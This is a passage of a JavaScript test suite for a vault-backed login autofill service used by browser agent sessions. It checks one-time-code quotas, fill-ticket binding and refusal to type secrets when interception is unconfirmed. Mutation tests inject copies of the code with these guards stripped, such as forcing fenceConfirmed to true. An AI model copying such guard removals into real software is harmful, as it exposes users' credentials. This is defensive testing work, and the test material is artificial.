          const subDir = path.join(dirM10, `r26-m2-${tag}`);
          fs.mkdirSync(subDir, { recursive: true });
          let totpAuditLines = 0;
          let totpCodeCalls = 0;
          const engOtp = VE.create({ dataDir: subDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
          await engOtp.setup('Minor2#OtpPass9');
          const origAudit = engOtp.audit.bind(engOtp);
          engOtp.audit = (ev, payload) => {
            if (ev === 'vault-totp-use') totpAuditLines++;
            return origAudit(ev, payload);
          };
          const gOtp = GS.create({ memory: true });
          const totpMod = VT.create({ dataDir: subDir, vault: engOtp, now: () => 1_700_500_000_000, log: () => {} });
          totpMod.addEntry({ name: 'm2otp', seed: 'JBSWY3DPEHPK3PXP', issuer: 'Shop', account: 'otpuser' }, { who: 'owner' });
          const logOtp = LoginsMod.create({
            vault: engOtp,
            grants: () => gOtp,
            totpCode: (name, opts) => { totpCodeCalls++; return totpMod.codeForLogin(name, opts); },
            log: () => {},
          });
          logOtp.addOwn({ origin: 'https://shop.example.test', username: 'otpuser', password: 'OtpUser!Pass99', totpName: 'm2otp' }, { who: 'owner' });
          logOtp.grant('web-login:https://shop.example.test#otpuser', 'this-account', 'session:conv-m2');

          fkR24.setDom(tidR24, {
            url: 'https://shop.example.test/otp',
            elements: [{ id: 'otpbox', tag: 'input', type: 'text', autocomplete: 'one-time-code', name: 'Verification code' }],
          });
          const profM2 = { id: tag === 'green' ? 'bp-000028aa' : 'bp-000028bb', label: 'M2' };
          const kM2 = {
            clock: () => Date.now(),
            profileByRef: (r) => (r === profM2.id || r === 'shop' ? profM2 : null),
            profile: (id) => (id === profM2.id ? profM2 : null),
            setFor: () => ({ attachments: [{ profileId: profM2.id, alias: 'shop', label: 'M2', isDefault: true }], handles: ['shop'] }),
            resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: profM2.id, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
            attach: async () => ({ profile: profM2, browser: { state: 'ready' }, lease: { profileId: profM2.id, browserKey: 'bk-000028cc', sessionId: 's-m2', since: 1 }, cdpUrl: fkR24.wsUrl, env: [], pinTab: false, others: 0 }),
            cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
            socketRootOf: () => ({ socketDir: path.join(subDir, 'ab'), runtimeDir: subDir }),
            configFileFor: () => null,
            audit() {},
            noteLeaseUrl() {},
            tell() {},
            leasesFor: () => [{ profileId: profM2.id, browserKey: 'bk-000028cc', sessionId: 's-m2' }],
            statusFor: () => ({ ephemeral: null, leases: [{ profileId: profM2.id, browserKey: 'bk-000028cc', sessionId: 's-m2' }] }),
            inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
            ephemeralFor: () => null,
            onLease: () => () => {},
            saveLoginFenceState() {},
            loginFenceStateOf: () => null,
            loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M2', action }),
          };
          const wM2 = Dm.create({ keeper: kM2, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000028cc', sessionId: 's-m2' }], leaseCountOf: () => 1, logins: logOtp });
          await wM2.arm(profM2.id);
          wM2.noteActiveTab({ profileId: profM2.id, browserKey: 'bk-000028cc' }, tidR24);
          const tokM2 = 'vsst_' + crypto.randomBytes(12).toString('hex');
          const sessM2 = { agentToken: tokM2, _browserKey: 'bk-000028cc', _browserVariant: 'D', name: 'M2 Agent', cwd: subDir, backendSessionId: 'conv-m2' };
          RB.setup({ keeper: kM2, activeSessions: new Map([['s-m2', sessM2]]), dialogs: wM2, logins: logOtp, tasksForSession: () => [] });
          const appM2 = express();
          appM2.use(express.json());
          appM2.use(RB.router);
          const srvM2 = await new Promise((r) => { const s = appM2.listen(0, '127.0.0.1', () => r(s)); });
          try {
            const base = `http://127.0.0.1:${srvM2.address().port}`;
            const hdr = { 'content-type': 'application/json', authorization: `Bearer ${tokM2}` };
            const post = async (u, b) => {
              const r = await fetch(`${base}${u}`, { method: 'POST', headers: hdr, body: JSON.stringify(b) });
              return { status: r.status, json: await r.json() };
            };
            // Simulate exact CLI `fill --vault .../otp` sequence: (1) `prepare: true` -> (2) `/resolve` -> (3) `fill-vault` -> (4) `/audit`
            const runFullCliOtp = async (selector) => {
              const p1 = await post('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: selector, spec: 'shop.example.test#otpuser/otp' });
              if (p1.status !== 200) return { step: 'prepare', status: p1.status, code: p1.json?.code };
              const p2 = await post('/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', selector, '--vault', 'shop.example.test#otpuser/otp'], wrapper: true, fillTicket: p1.json?.fillTicket });
              const p3 = await post('/api/agent/browser/fill-vault', { profile: profM2.id, target: selector, spec: 'shop.example.test#otpuser/otp' });
              await post('/api/agent/browser/audit', { profile: profM2.id, verb: 'fill', ok: p3.status === 200, since: p2.json?.at || 1 });
              return { step: 'fill', status: p3.status, code: p3.json?.code || null };
            };

            const miss = await runFullCliOtp('#does-not-exist');
            const callsAfterMiss = totpCodeCalls;
            const auditsAfterMiss = totpAuditLines;

            const sixRuns = [];
            for (let i = 0; i < 6; i++) {
              const r = await runFullCliOtp('#otpbox');
              sixRuns.push({ i: i + 1, ...r, totpCodeCalls, totpAuditLines });
            }
            return { miss, callsAfterMiss, auditsAfterMiss, sixRuns };
          } finally {
            srvM2.close();
            wM2.shutdown();
            engOtp.close();
            LF.clearAllFilledSecrets();
          }
        };

        const greenOtp = await runOtpQuotaProbe(Lm, 'green');
        ok(greenOtp.miss.status === 409 && greenOtp.miss.code === 'target_not_found' && greenOtp.callsAfterMiss === 0 && greenOtp.auditsAfterMiss === 0
          && greenOtp.sixRuns[0].status === 200 && greenOtp.sixRuns[0].totpCodeCalls === 1 && greenOtp.sixRuns[0].totpAuditLines === 1
          && greenOtp.sixRuns.every((r, idx) => r.status === 200 && r.totpCodeCalls === idx + 1 && r.totpAuditLines === idx + 1),
          'r26 Minor 2: missing target mints 0 OTPs; 1 /otp fill mints 1 code and writes 1 vault-totp-use line; 6 consecutive /otp fills in 1 min ALL succeed (6 calls total)',
          greenOtp);

        // MUTANT 28 RED: restore r25's eager `totpCode(...)` before `if (checkOnly)` -> 4 calls per fill, and fill #6 hits 429 (`code_paced` / `login_no_otp`)!
        const m28LgSrc = lgSrc.replace(
          "      if (checkOnly) {\n        let tl = [];\n        try { tl = vault.secretNames() || []; } catch { tl = []; }\n        const totpEntry = tl.find((s) => s && s.name === `totp:${str(o.rec.totpName)}`);\n        if (!totpEntry || (isOwn && (!totpEntry.owner || !ownSet.has(totpEntry.owner)))) {\n          return named('login_no_otp', `the paired two-step code (${o.rec.totpName}) could not be opened — ask the owner in the Vault window`);\n        }\n        return { ok: true, checkOnly: true, name: v.name, origin: v.origin, user: v.user, field: 'otp', slot: 'otp', generated: false, pending: o.rec.pending ? o.rec.pending.kind : null };\n      }\n      let c = null;\n      try { c = totpCode(o.rec.totpName, { conv, ...(isOwn ? { owners: [...ownSet] } : {}) }); } catch { c = null; }",
          "      let c = null;\n      try { c = totpCode(o.rec.totpName, { conv, ...(isOwn ? { owners: [...ownSet] } : {}) }); } catch { c = null; }\n      if (checkOnly && c && c.ok && c.code) {\n        return { ok: true, checkOnly: true, name: v.name, origin: v.origin, user: v.user, field: 'otp', slot: 'otp', generated: false, pending: o.rec.pending ? o.rec.pending.kind : null };\n      }",
        );
        const LM_M28 = m28LgSrc !== lgSrc ? MUT.load('src/server/browser-logins.js', m28LgSrc, 'r26-m2-eager-totp-on-precheck') : null;
        if (LM_M28) {
          const redOtp = await runOtpQuotaProbe(LM_M28, 'red');
          ok(redOtp.sixRuns[0].totpCodeCalls >= 4 && redOtp.sixRuns[5].status !== 200,
            'MUTANT 28 RED (r26 Minor 2 eager-totp-on-precheck): calling totpCode during checkOnly burns 4 quota slots per fill and fails fill #6 under 20/min pace limit',
            { firstCalls: redOtp.sixRuns[0].totpCodeCalls, sixth: redOtp.sixRuns[5] });
        } else ok(false, 'MUTANT 28 RED (r26 Minor 2): anchor not found');
      }

      // ── r26 MINOR 5: `consumeVaultFillTicket` binding to `argv` (`verb` + `target` + `spec` + `generate` + `user`) + MUTANT 29 RED ──
      {
        const express = require(path.join(REPO, 'node_modules/express'));
        const RB = require(path.join(REPO, 'src/routes/browser.js'));
        const m29RbSrc = rbSrc.replace(
          "  const V = require('../browser-verbs.js');",
          "  return true;\n  const V = require('../browser-verbs.js');",
        );
        const RB_M29 = m29RbSrc !== rbSrc ? MUT.load('src/routes/browser.js', m29RbSrc, 'r26-m5-ticket-skips-argv-check') : null;
        if (RB_M29 && typeof RB_M29.setup === 'function') {
          const runTicketProbe = async (RoutesMod, tag) => {
            const prof = { id: `bp-m29-${tag}`, label: 'M29' };
            fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
            const k = {
              clock: () => Date.now(),
              profileByRef: (r) => (r === prof.id || r === 'shop' ? prof : null),
              profile: (id) => (id === prof.id ? prof : null),
              setFor: () => ({ attachments: [{ profileId: prof.id, alias: 'shop', label: 'M29', isDefault: true }], handles: ['shop'] }),
              resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: prof.id, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
              attach: async () => ({ profile: prof, browser: { state: 'ready' }, lease: { profileId: prof.id, browserKey: 'bk-m29', sessionId: 's-m29', since: 1 }, cdpUrl: fkR24.wsUrl, env: [], pinTab: false, others: 0 }),
              cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
              socketRootOf: () => ({ socketDir: path.join(dirM10, `ab29-${tag}`), runtimeDir: dirM10 }),
              configFileFor: () => null,
              audit() {},
              noteLeaseUrl() {},
              tell() {},
              leasesFor: () => [{ profileId: prof.id, browserKey: 'bk-m29', sessionId: 's-m29' }],
              statusFor: () => ({ ephemeral: null, leases: [{ profileId: prof.id, browserKey: 'bk-m29', sessionId: 's-m29' }] }),
              inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
              ephemeralFor: () => null,
              onLease: () => () => {},
              saveLoginFenceState() {},
              loginFenceStateOf: () => null,
              loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M29', action }),
            };
            const w = Dm.create({ keeper: k, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-m29', sessionId: 's-m29' }], leaseCountOf: () => 1, logins: logR24 });
            await w.arm(prof.id);
            w.noteActiveTab({ profileId: prof.id, browserKey: 'bk-m29' }, tidR24);
            const tok = 'vsst_' + crypto.randomBytes(12).toString('hex');
            const sess = { agentToken: tok, _browserKey: 'bk-m29', _browserVariant: 'D', name: 'M29 Agent', cwd: dirM10, backendSessionId: 'conv-mr24' };
            RoutesMod.setup({ keeper: k, activeSessions: new Map([['s-m29', sess]]), dialogs: w, logins: logR24, tasksForSession: () => [] });
            const app = express();
            app.use(express.json());
            app.use(RoutesMod.router);
            const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
            try {
              const post = async (u, b) => {
                const r = await fetch(`http://127.0.0.1:${srv.address().port}${u}`, {
                  method: 'POST',
                  headers: { 'content-type': 'application/json', authorization: `Bearer ${tok}` },
                  body: JSON.stringify(b),
                });
                return r.json();
              };
              const t1 = await post('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#pw', spec: 'shop.example.test#alice/password' });
              const swapVerb = await post('/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '#other'], wrapper: true, fillTicket: t1.fillTicket });
              const t2 = await post('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#pw', spec: 'shop.example.test#alice/password' });
              const swapTarget = await post('/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#other', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: t2.fillTicket });
              return {
                verbHasSocket: Boolean(swapVerb.socketDir && swapVerb.cdpUrl),
                targetHasSocket: Boolean(swapTarget.socketDir && swapTarget.cdpUrl),
              };
            } finally {
              srv.close();
              w.shutdown();
            }
          };
          const realBind = await runTicketProbe(RB, 'real');
          const mutBind = await runTicketProbe(RB_M29, 'mut');
          ok(realBind.verbHasSocket === true && realBind.targetHasSocket === true
            && mutBind.verbHasSocket === false && mutBind.targetHasSocket === false,
            'MUTANT 29 RED (r26 Minor 5 fillTicket-argv-binding): real consumeVaultFillTicket rejects verb/target-swapped argv (retains socketDir+cdpUrl); mutant returning true before argv check strips socketDir+cdpUrl',
            { realBind, mutBind });
        } else ok(false, 'MUTANT 29 RED (r26 Minor 5): anchor not found');
      }

      // ── r27 COMPULSORY 2: Fence Not Confirmed Active (`Fetch.enable` error / timeout, `Network.enable` error) => Refuse by Name (`login_fence_unavailable`), `0` `Input.insertText` + MUTANT 31 RED ──
      {
        const { WebSocketServer } = require(path.join(REPO, 'node_modules/ws'));
        const runFenceFailProbe = async (DialogsMod, faultKind, { viaRoute = false } = {}) => {
          let insertCalls = 0;
          let resolveCalls = 0;
          let firstFetchFaulted = false;
          let firstNetFaulted = false;
          let failNextRemodeFetch = false;
          let probeHolders = holdersM;
          let dmRef = null;
          const wssF = new WebSocketServer({ host: '127.0.0.1', port: 0 });
          await new Promise((r) => wssF.once('listening', r));
          const fPort = wssF.address().port;
          wssF.on('connection', (sock) => {
            sock.on('message', async (raw) => {
              const m = JSON.parse(String(raw));
              const send = (result) => sock.send(JSON.stringify({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result }));
              const sendErr = (code, message) => sock.send(JSON.stringify({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code, message } }));
              if (m.method === 'Browser.getVersion') return send({ product: 'Chrome/154', userAgent: 'HeadlessChrome/154' });
              if (m.method === 'Target.setDiscoverTargets') {
                send({});
                sock.send(JSON.stringify({ method: 'Target.targetCreated', params: { targetInfo: { targetId: 'tab-f1', type: 'page', url: 'https://shop.example.test/login', title: 'Login' } } }));
                return;
              }
              if (m.method === 'Target.attachToTarget') return send({ sessionId: 'sid-f1' });
              if (m.method === 'Target.getTargets') return send({ targetInfos: [{ targetId: 'tab-f1', type: 'page', url: 'https://shop.example.test/login', title: 'Login' }] });
              if (m.method === 'Target.getTargetInfo') return send({ targetInfo: { targetId: 'tab-f1', type: 'page', url: 'https://shop.example.test/login' } });
              if (m.method === 'Page.getFrameTree') return send({ frameTree: { frame: { id: 'tab-f1', url: 'https://shop.example.test/login', securityOrigin: 'https://shop.example.test' }, childFrames: [] } });
              if (m.method === 'Page.createIsolatedWorld') return send({ executionContextId: 91 });
              if (m.method === 'Fetch.enable') {
                if (failNextRemodeFetch) {
                  failNextRemodeFetch = false;
                  return sendErr(-32000, 'Fetch dropped on remode before insert');
                }
                const pats = m.params?.patterns || [];
                const isFillFetch = pats.some((p) => p.requestStage === 'Response') || (pats.length === 1 && pats[0].urlPattern === '*' && !pats[0].resourceType);
                if (isFillFetch && !firstFetchFaulted) {
                  if (faultKind === 'fetch-error') {
                    firstFetchFaulted = true;
                    return sendErr(-32000, 'Fetch domain unavailable');
                  }
                  if (faultKind === 'fetch-timeout') {
                    firstFetchFaulted = true;
                    return; // never answer -> triggers interceptTimeoutMs
                  }
                }
                return send({});
              }
              if (m.method === 'Network.enable') {
                if (faultKind === 'net-error' && !firstNetFaulted) {
                  firstNetFaulted = true;
                  return sendErr(-32000, 'Network domain unavailable');
                }
                return send({});
              }
              if (m.method === 'Runtime.evaluate') {
                const expr = String(m.params?.expression || '');
                if (expr.includes('isoOrigin')) {
                  return send({ result: { value: { ok: true, isoOrigin: 'https://shop.example.test', isoHref: 'https://shop.example.test/login' } } });
                }
                // `armAndPrepareTargetExpr` runs AFTER `preArmIntercept` confirmed the fence and BEFORE `guardBeforeInsert` + `resolveValue` + `Input.insertText`.
                if (faultKind === 'drop-before-insert' && !firstFetchFaulted && expr.includes('inert') && dmRef) {
                  firstFetchFaulted = true;
                  failNextRemodeFetch = true;
                  probeHolders = [{ browserKey: 'bk-human', sessionId: null, ephemeral: false, human: true, input: 'user' }];
                  await dmRef.arm('prof-fence', { by: 'person', budgetMs: 400 }); // flips w.mode -> 'person' -> syncTabFetchMode -> Fetch.enable fails -> e.fetchMode = null, e.credFetchAll = false
                }
                return send({ result: { value: { ok: true, verifiedEmpty: true } } });
              }
              if (m.method === 'Input.insertText') {
                insertCalls++;
                return send({});
              }
              return send({});
            });
          });

          const loginsStub = {
            precheckVaultFill: () => ({ ok: true, origin: 'https://shop.example.test', field: 'password', secret: true }),
            resolveFill: (opts) => {
              if (!opts.checkOnly) resolveCalls++;
              return {
                ok: true,
                checkOnly: !!opts.checkOnly,
                name: 'web-login:https://shop.example.test#alice',
                origin: 'https://shop.example.test',
                user: 'alice',
                field: 'password',
                slot: 'current',
                secret: true,
                value: opts.checkOnly ? undefined : 'FenceMustHold!9',
                rev: 1,
                entryGen: 'lg-abcdef012345',
                scrubSecrets: opts.checkOnly ? [] : ['FenceMustHold!9'],
                noteFillUse: () => ({ receipt: 'vr-fence1' }),
              };
            },
            isLocked: () => false,
          };
          const fenceProf = { id: 'prof-fence', label: 'FenceProfile' };
          const keeperStub = {
            ...skR24,
            profile: (id) => (id === 'prof-fence' ? fenceProf : null),
            profileByRef: (r) => (r === 'prof-fence' ? fenceProf : null),
            setFor: () => ({ attachments: [{ profileId: 'prof-fence', alias: 'prof-fence', label: 'FenceProfile', isDefault: true }], handles: ['prof-fence'] }),
            leasesFor: () => [{ profileId: 'prof-fence', browserKey: 'bk-mr24', sessionId: 'sid-fence-drop' }],
            inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
            ephemeralFor: () => null,
            audit() {},
            noteLeaseUrl() {},
            onLease: () => () => {},
            cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${fPort}` }),
            attach: async () => ({ ok: true, profileId: 'prof-fence', key: 'bk-mr24', mediated: true }),
          };
          const dm = DialogsMod.create({
            keeper: keeperStub,
            logins: loginsStub,
            holdersOf: () => probeHolders,
            leaseCountOf: () => 1,
            enableTimeoutMs: 400,
            interceptTimeoutMs: 80,
            log: quiet,
          });
          dmRef = dm;
          let routeSrv = null;
          try {
            await dm.arm('prof-fence');
            dm.noteActiveTab({ profileId: 'prof-fence', browserKey: 'bk-mr24' }, 'tab-f1');
            let first;
            let httpStatus = null;
            if (viaRoute) {
              const fSid = 'sid-fence-drop';
              const fTok = 'vsst_fencedrop123456';
              const fSessions = new Map([[fSid, { agentToken: fTok, _browserKey: 'bk-mr24', _browserVariant: 'D', name: 'Fence Agent', cwd: dirM10, backendSessionId: 'conv-fence' }]]);
              Rm.setup({ keeper: keeperStub, activeSessions: fSessions, dialogs: dm, logins: loginsStub, tasksForSession: () => [] });
              const fApp = express();
              fApp.use(express.json());
              fApp.use(Rm.router);
              routeSrv = await new Promise((resolve) => { const s = fApp.listen(0, '127.0.0.1', () => resolve(s)); });
              const rPort = routeSrv.address().port;
              const resp = await fetch(`http://127.0.0.1:${rPort}/api/agent/browser/fill-vault`, {
                method: 'POST',
                headers: { 'content-type': 'application/json', authorization: `Bearer ${fTok}` },
                body: JSON.stringify({ profile: 'prof-fence', target: '#pw', spec: 'shop.example.test#alice/password' }),
              });
              httpStatus = resp.status;
              first = await resp.json();
            } else {
              first = await dm.fillVaultField({ profileId: 'prof-fence', browserKey: 'bk-mr24' }, {
                target: '#pw',
                spec: 'shop.example.test#alice/password',
                targetId: 'tab-f1',
                facts: { conversationKeys: ['conv-fence'] },
              });
            }
            const firstInserts = insertCalls;
            const firstResolves = resolveCalls;
            const second = faultKind === 'fetch-error'
              ? await dm.fillVaultField({ profileId: 'prof-fence', browserKey: 'bk-mr24' }, {
                target: '#pw',
                spec: 'shop.example.test#alice/password',
                targetId: 'tab-f1',
                facts: { conversationKeys: ['conv-fence'] },
              })
              : null;
            return { first, httpStatus, firstInserts, firstResolves, second, totalInserts: insertCalls };
          } finally {
            if (routeSrv) await new Promise((r) => routeSrv.close(r));
            dm.shutdown();
            await new Promise((r) => wssF.close(r));
          }
        };

        const pFetchErr = await runFenceFailProbe(Dm, 'fetch-error');
        const pFetchTimeout = await runFenceFailProbe(Dm, 'fetch-timeout');
        const pNetErr = await runFenceFailProbe(Dm, 'net-error');
        const pDropBeforeInsert = await runFenceFailProbe(Dm, 'drop-before-insert', { viaRoute: true });
        ok(!pFetchErr.first.ok && pFetchErr.first.code === 'login_fence_unavailable'
          && /Fetch\.enable failed: Fetch domain unavailable/.test(String(pFetchErr.first.error || ''))
          && pFetchErr.firstInserts === 0 && pFetchErr.firstResolves === 0
          && Boolean(pFetchErr.second && pFetchErr.second.ok && pFetchErr.totalInserts === 1)
          && !pFetchTimeout.first.ok && pFetchTimeout.first.code === 'login_fence_unavailable'
          && /Fetch\.enable timed out/.test(String(pFetchTimeout.first.error || ''))
          && pFetchTimeout.firstInserts === 0 && pFetchTimeout.firstResolves === 0
          && !pNetErr.first.ok && pNetErr.first.code === 'login_fence_unavailable'
          && /Network\.enable failed/.test(String(pNetErr.first.error || ''))
          && pNetErr.firstInserts === 0 && pNetErr.firstResolves === 0
          && pDropBeforeInsert.httpStatus === 409 && !pDropBeforeInsert.first.ok && pDropBeforeInsert.first.code === 'login_fence_unavailable'
          && /interception dropped before typing/.test(String(pDropBeforeInsert.first.error || ''))
          && pDropBeforeInsert.firstInserts === 0 && pDropBeforeInsert.firstResolves === 0,
          'r27 Compulsory 2: Fetch.enable error, Fetch.enable timeout, Network.enable error, and fence drop after preArmIntercept before typing (HTTP 409) all refuse login_fence_unavailable with 0 Input.insertText calls and 0 secret resolves (and recover cleanly on the next fill)',
          { pFetchErr, pFetchTimeout, pNetErr, pDropBeforeInsert });

        // MUTANT 31 RED (r27 Compulsory 2 `fence-unconfirmed-allowed` at runActiveFill / preArmIntercept):
        const m31BdSrc = bdSrc.replace(
          '    const fenceConfirmed = (fm, needCred = false) => Boolean(',
          '    const fenceConfirmed = (fm, needCred = false) => true || Boolean(',
        );
        if (m31BdSrc !== bdSrc) {
          const DM_M31 = MUT.load('src/server/browser-dialogs.js', m31BdSrc, 'r27-c2-fence-unconfirmed-allowed');
          const mFetchErr = await runFenceFailProbe(DM_M31, 'fetch-error');
          const mFetchTimeout = await runFenceFailProbe(DM_M31, 'fetch-timeout');
          ok(mFetchErr.first.ok === true && mFetchErr.firstInserts === 1
            && mFetchTimeout.first.ok === true && mFetchTimeout.firstInserts === 1,
            'MUTANT 31 RED (r27 Compulsory 2 fence-unconfirmed-allowed): stripping fenceConfirmed lets both Fetch.enable error and Fetch.enable timeout proceed to Input.insertText (insertCalls=1)',
            { mFetchErr, mFetchTimeout });
        } else ok(false, 'MUTANT 31 RED (r27 Compulsory 2): anchor not found');

        // MUTANT 32 RED (r27 Compulsory 2 3rd fence check inside `guardBeforeInsert` at `:3936`):
        // Keep `runActiveFill` (:3803) and `preArmIntercept` (:3922) intact, strip ONLY the `guardBeforeInsert` check!
        const m32BdSrc = bdSrc.replace(
          "          if (!fenceConfirmed({ ok: true }, pre.field !== 'user')) {\n            return { ok: false, code: 'login_fence_unavailable', error: 'refused to fill because browser request interception dropped before typing — nothing was filled' };\n          }",
          '          /* MUTANT 32: 3rd fence check in guardBeforeInsert stripped */',
        );
        if (m32BdSrc !== bdSrc) {
          const DM_M32 = MUT.load('src/server/browser-dialogs.js', m32BdSrc, 'r27-c2-guard-before-insert-fence-stripped');
          const mDrop = await runFenceFailProbe(DM_M32, 'drop-before-insert');
          ok(mDrop.first.ok === true && mDrop.firstInserts === 1 && mDrop.firstResolves === 1,
            'MUTANT 32 RED (r27 Compulsory 2 guardBeforeInsert-fence-stripped): stripping ONLY the 3rd fence check in guardBeforeInsert lets a post-preArm fence drop resolve the secret and call Input.insertText (insertCalls=1, resolveCalls=1)',
            mDrop);
        } else ok(false, 'MUTANT 32 RED (r27 Compulsory 2): anchor not found');
      }
    } finally {
      LF.clearAllFilledSecrets?.();
      LF_M15?.clearAllFilledSecrets?.();
      engR24.close();
      await fkR24.close();
      fs.rmSync(dirM10, { recursive: true, force: true });
    }
  }

  await runR28LoginNails({ repoDir: REPO, ok, MUT });
  const [r29Child, r30Child] = await Promise.all([r29ChildPromise, r30ChildPromise]);
  replayNailChild(r29Child, runR29LoginNails);
  replayNailChild(r30Child, runR30LoginNails);

  // lane chrome-157 (the round-32 take-over): 34 — round 32 deleted the legs that pinned «a restart and an unlock restore» with
  // their mutants (M19 among them); the floor follows the copies this suite still makes (on the builder's bytes too: 34 of 35)
  for (const r of copiesCensus(MUT.files, MUT.dir, REPO, { minCopies: 34 })) {
    ok(r.pass, 'mutant-copy census: ' + r.name, r.pass ? undefined : r.detail);
  }
}

console.log(fail ? `\nFAIL (${fail} failed, ${pass} passed)` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
